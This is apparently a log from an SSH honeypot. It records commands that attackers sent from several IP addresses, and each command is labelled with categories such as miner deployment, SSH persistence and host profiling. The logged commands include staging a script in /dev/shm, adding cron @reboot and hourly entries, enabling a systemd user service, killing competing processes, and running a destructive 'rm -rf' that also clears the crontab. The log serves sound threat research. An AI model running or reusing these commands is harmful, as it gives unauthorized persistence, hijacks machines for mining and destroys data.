1776710595_149.210.235.123_41472_sshshadow,149.210.235.123,test,,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,,
1776710597_149.210.235.123_38800_sshshadow,149.210.235.123,admin,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Generic recon,False,,normal_exit,
1776710599_149.210.235.123_41472_sshshadow,149.210.235.123,test,non_interactive_exec,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,exit_code_1,
1776767603_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,uname -a,Data / credential hunting; GCS-aware discovery; Host profiling; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",normal_exit,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767607_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Data / credential hunting; Generic recon; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",normal_exit,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767610_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,cat /proc/cpuinfo | grep processor | wc -l,Data / credential hunting; Host profiling; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767614_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,"cd ""/dev/shm"" && if [ ! -f ""w.sh"" ]; then cat > ""w.sh"" && chmod +x w.sh; fi",Data / credential hunting; File transfer / staging; GCS-aware discovery; Generic recon; Host profiling; Miner deployment; SSH persistence,True,"script_upload_via_stdin_or_scp; suspicious_created_files:dev/shm/w.sh,tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json; script_body_captured_in_exec_stdout",normal_exit,dev/shm/w.sh; tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767617_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,"CRON=""$(crontab -l 2>/dev/null || true)"" echo ""$CRON"" | grep -F '/dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges""' >/dev/null 2>&1 || \ printf '%s\n%s\n' ""@reboot /dev/shm/w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" ""0 * * * * cd ""/dev/shm"" && ./w.sh ""astats"" ""netai"" ""kstats"" ""ssh 2 ranges"""" | (cat -; echo ""$CRON"") | crontab -",Data / credential hunting; Miner deployment; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767621_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service',Data / credential hunting; File transfer / staging; Miner deployment; SSH persistence,True,"script_upload_via_stdin_or_scp; suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_1,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767625_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,"ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10",Data / credential hunting; GCS-aware discovery; Generic recon; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",normal_exit,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767628_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,readlink -f /proc/gcs/exe,Data / credential hunting; GCS-aware discovery; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767632_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,kill -9 $(lsof +D . 2>/dev/null | awk '{print $2}' | sort -u); rm -rf .; crontab -l 2>/dev/null | grep -v . | crontab -,Data / credential hunting; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767635_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,kill -9 gcs,Data / credential hunting; GCS-aware discovery; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_1,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767638_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,readlink -f /proc/gcs/exe,Data / credential hunting; GCS-aware discovery; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767641_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,non_interactive_exec,kill -9 $(lsof +D . 2>/dev/null | awk '{print $2}' | sort -u); rm -rf .; crontab -l 2>/dev/null | grep -v . | crontab -,Data / credential hunting; SSH persistence,True,"suspicious_created_files:tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",exit_code_127,tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
1776767645_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,,kill -9 gcs,GCS-aware discovery,False,,,
1776767650_149.210.235.123_60696_sshshadow,149.210.235.123,deploy,,cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats,File transfer / staging; Miner deployment,True,script_upload_via_stdin_or_scp,,
1776767794_149.210.235.123_37116_sshshadow,149.210.235.123,test,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776767795_149.210.235.123_37116_sshshadow,149.210.235.123,test,,"sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd ""$d"" 2>/dev/null && pwd && break; done'",Generic recon,True,suspicious_created_files:usr/lib/python3.11/sitecustomize.py,exit_code_125,usr/lib/python3.11/sitecustomize.py
1776767796_149.210.235.123_37116_sshshadow,149.210.235.123,test,,cat /proc/cpuinfo | grep processor | wc -l,Host profiling,True,suspicious_created_files:usr/lib/python3.11/sitecustomize.py,exit_code_125,usr/lib/python3.11/sitecustomize.py
1776778791_104.248.164.226_56802_sshshadow,104.248.164.226,deploy,,uname -a,GCS-aware discovery; Host profiling,False,,,
1776796197_104.39.130.23_56542_sshshadow,104.39.130.23,admin,interactive_shell,,Data / credential hunting; Generic recon; SSH persistence,True,"suspicious_created_files:tmp/.session_bashrc,tmp/.ssh-shadow/session/commands.jsonl,tmp/.ssh-shadow/session/events.jsonl,tmp/.ssh-shadow/session/provenance.json",normal_exit,tmp/.session_bashrc; tmp/.ssh-shadow/session/commands.jsonl; tmp/.ssh-shadow/session/events.jsonl; tmp/.ssh-shadow/session/provenance.json
